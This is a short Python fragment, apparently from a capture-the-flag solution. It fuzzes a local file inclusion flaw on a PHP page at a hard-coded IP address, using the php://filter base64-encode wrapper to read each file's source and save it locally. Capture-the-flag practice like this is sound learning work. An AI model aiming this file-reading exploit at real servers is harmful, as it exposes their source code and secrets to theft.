...
def get_source(pl):
    res = req.get(
        url="http://120.77.152.169:8088/moectf/lfi/index.php?file=php://filter/convert.base64-encode/resource=%s" % pl)
...
def fuzz():
    for pl in ll:
        res = get_source(pl)
        if res:
            with open("./fuzz_lfi/%s" % os.path.basename(pl), 'w') as f:
                res = base64.b64decode(res)
                f.write(res)


def save(filename, data):
    with open("./fuzz_lfi/%s" % os.path.basename(filename), 'wb') as f:
        # res = base64.b64decode(res)
        f.write(data)
